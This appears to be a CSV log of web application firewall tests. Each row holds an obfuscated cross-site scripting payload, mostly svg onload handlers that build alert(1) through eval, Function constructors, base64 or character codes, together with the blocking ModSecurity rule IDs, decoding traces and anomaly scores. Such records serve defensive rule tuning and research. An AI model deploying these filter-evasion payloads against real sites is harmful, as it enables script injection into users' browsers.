1887,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='[].sort.constructor(&quot;al&quot;+&quot;ert(1)&quot;)()'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,132v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826773424.758194
1888,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='async function x(){eval(&quot;al&quot;+&quot;ert(1)&quot;)};x()'></svg>""></object>",0,1,block,12,"932100,933160,934100,934100,941100,941120,941130,941140,941160,941170,941300,949110","o110,7v217,176 || o113,44v217,176 || o113,5v217,176 || o113,5v217,176t:urlDecodeUni || v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,139v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",55,177826773680.690740
1889,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='(function(){return eval})()(&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,11,"933210,934100,934100,941100,941120,941130,941140,941160,941170,941300,949110","o94,62v217,175t:urlDecode,t:replaceComments,t:compressWhitespace || o95,11v217,175 || o95,11v217,175t:urlDecodeUni || v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,138v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",50,177826773890.148491
1890,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='({}.constructor.constructor(&quot;al&quot;+&quot;ert(1)&quot;)())'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,141v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826774019.894203
1891,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='globalThis[atob(&quot;ZXZhbA==&quot;)](&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,186t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,186t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,186t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,139v217,186t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,186t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,186t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,186t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826774224.257216
1895,"<svg onload=""(function(){var s='';[97,108,101,114,116,40,49,41].forEach(n=>s+=String.fromCharCode(n));(1,globalThis.Function)(s)()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o125,9v217,142t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,142 || o14,11v217,142t:urlDecodeUni || v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826775218.774077
1899,"<svg onload=""(function(){var p=decodeURIComponent('%61%6C%65%72%74%28%31%29');new Function(p)()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o74,9v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,107 || o14,11v217,107t:urlDecodeUni || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826776086.637974
1901,"<svg onload=""(function(){var m='al'+'ert(1)';globalThis[m.slice(0,5)]('1')})()""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,86 || o14,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826776591.593297
1903,"<svg onload=""(function(){var h='\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029';with(window){Function(h)()}})()""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o86,27v217,121t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,121 || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826776947.438400
1905,"<svg onload=""(function(){var f=Object.getPrototypeOf(async function(){}).constructor;new f(String.fromCharCode(97,108,101,114,116,40,49,41))()})()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,154 || v217,154t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,154t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,154t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826777455.277914
1911,"<svg onload=""(function(){var v=top[String.fromCharCode(70,117,110,99,116,105,111,110)];new v(String.fromCharCode(97,108,101,114,116,40,49,41))()})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,156 || v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,55v217,156t:urlDecodeUni,t:compressWhitespace || ",25,177826778720.181313
1914,"<svg onload=""((function(){var a=this[String.fromCharCode(97,116,111,98)];this[String.fromCharCode(101,118,97,108)](a('YWxlcnQoMSk='));})())""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o15,11v217,147 || v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,40v217,147t:urlDecodeUni,t:compressWhitespace || ",25,177826779385.894907
1915,"<svg onload=""new Function(atob('dmFyIGE9YXRvYjtldmFsKGEoJ1lXeGxjblFvTVNrPScpKTs='))()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826779655.593831
1916,"<svg onload=""(function(){var d=atob,e=Function;e(d('YWxlcnQoMSk='))();})()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826779836.698009
1917,"<svg onload=""((function(){var x=window['at'+'ob'];var y=window['ev'+'al'];y(x('YWxlcnQoMSk='));})())""></svg>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o15,11v217,108 || o15,11v217,108t:urlDecodeUni || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,17v217,108t:urlDecodeUni,t:compressWhitespace || ",30,177826780093.270025
1921,"<svg onload=""(function(){var f=window['\141\164\157\142'];var g=window['\145\166\141\154'];g(f('YWxlcnQoMSk='));})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,124 || v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,26v217,124t:urlDecodeUni,t:compressWhitespace || ",25,177826780923.323995
1924,"<svg onload=""(function(){var b=self['ato'+'b'],c=self['eva'+'l'];c(b('YWxlcnQoMSk='));})()""></svg>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,98 || o14,11v217,98t:urlDecodeUni || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,15v217,98t:urlDecodeUni,t:compressWhitespace || ",30,177826781588.372804
1925,"<svg onload=""((function(){var decode=atob,run=top[String.fromCharCode(101,118,97,108)];run(decode('YWxlcnQoMSk='));})())""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o15,11v217,128 || v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,40v217,128t:urlDecodeUni,t:compressWhitespace || ",25,177826781757.297766
1926,"<svg onload=""(function(){var s='YWxlcnQoMSk=';var decode=window['atob'];var execute=window['eval'];execute(decode(s));})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,130 || v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o57,14v217,130t:urlDecodeUni,t:compressWhitespace || ",25,177826781960.458709
1928,"<svg onload=""Function['prototype']['constructor']['call'](this,atob('YWxlcnQoMSk='))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o21,65v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826782369.072073
1930,"<svg onload=""(function(){var z=globalThis['atob'];globalThis['eval'](z('YWxlcnQoMSk='));})()""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o60,32v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826782848.971012
1954,"<svg onload=""top['Function']('retur'+'n aler'+'t')()(1)"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,39v217,57t:urlDecode,t:replaceComments,t:compressWhitespace || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,57t:urlDecodeUni,t:compressWhitespace || ",25,177826788046.751010
1964,"<svg onload=""globalThis['Function']('ale'+'rt(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o23,29v217,54t:urlDecode,t:replaceComments,t:compressWhitespace || v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826790213.726821
1965,"<svg onload=""Reflect.construct(Function,['ale'+'rt(1)'])()"">",0,1,block,4,"941100,941120,941160,949110","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826790576.595609
1966,"<svg onload=""Reflect.apply([]['fill']['constructor'],null,['ale'+'rt(1)'])()"">",0,1,block,4,"941100,941120,941160,949110","v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826790772.374102
1967,"<svg onload=""(function(){})['constructor']['constructor']('ale'+'rt(1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,61v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,76 || o14,11v217,76t:urlDecodeUni || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826790926.974678
1974,"<svg onload=""(function(){return[]['constructor']['constructor']('al'+'ert(1)')}())()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,71v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,92 || o14,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826792424.789415
1976,"<svg onload=""self['Function']('a'+'lert(1)')()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,29v217,54t:urlDecode,t:replaceComments,t:compressWhitespace || v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,54t:urlDecodeUni,t:compressWhitespace || ",25,177826792985.881480
1978,"<svg onload=""(function(){return this['constructor']['constructor']('al'+'ert'+'(1)')}())()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,77v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,98 || o14,11v217,98t:urlDecodeUni || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,19v217,98t:urlDecodeUni,t:compressWhitespace || ",35,177826793483.253513
1982,"<svg onload=""(function x(){return window['Function']('a'+'lert'+'(1)')}())()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o13,63v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,18v217,84t:urlDecodeUni,t:compressWhitespace || ",25,177826794328.719234
1987,"<svg onload=""async function x(){await[].constructor.constructor('ale'+'rt(1)')()};x()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o29,56v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826795414.383278
2011,"<svg onload=""(function(){return (function(){return this})()['eva'+'l']('ale'+'rt(1)')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,76v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,91 || o14,11v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826800771.337521
2013,"<svg onload=""(function(){(()=>this)()['Function']('ale'+'rt(1)')()})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,57v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,72 || o14,11v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,19v217,72t:urlDecodeUni,t:compressWhitespace || ",35,177826801295.346612
2015,"<svg onload=""(function(){self['\x65val']('\x61lert(1)')})()"">",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,61 || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,15v217,61t:urlDecodeUni,t:compressWhitespace || ",25,177826801689.340543
2016,"<svg onload=""(function(){window['ev'+'al'](atob('YWxlcnQoMSk='))})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,55v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,70 || o14,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,17v217,70t:urlDecodeUni,t:compressWhitespace || ",35,177826801879.891286
2017,"<svg onload=""(function(){return[]['filter']['constructor']('retu'+'rn ale'+'rt(1)')()})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,76v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,91 || o14,11v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826802133.325709
2018,"<svg onload=""(function(){globalThis['ev'+'al']('ale'+'rt(1)')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,52v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,67 || o14,11v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826802330.601017
2021,"<svg onload=""(function(){throw{get toString(){return top['eva'+'l']('ale'+'rt(1)')}}})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,75v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,90 || o14,11v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,14v217,90t:urlDecodeUni,t:compressWhitespace || ",35,177826802916.350025
2023,"<svg onload=""(function(){return(0,top['eva'+'l'])('ale'+'rt(1)')})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o37,31v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,70 || o14,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,14v217,70t:urlDecodeUni,t:compressWhitespace || ",35,177826803464.057513
